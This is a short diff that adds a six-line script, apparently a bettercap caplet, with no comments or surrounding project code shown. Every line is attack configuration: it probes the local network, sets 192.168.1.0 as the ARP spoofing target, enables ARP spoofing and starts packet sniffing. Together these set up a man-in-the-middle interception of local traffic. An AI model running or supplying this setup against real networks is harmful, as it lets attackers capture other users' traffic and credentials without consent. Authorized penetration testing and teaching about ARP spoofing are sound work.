@@ -1,0 +1,6 @@
+net.probe on
+sleep 8
+set arp.spoof targets 192.168.1.0
+arp.spoof on
+set net.sniff.verbose false
+net.sniff on
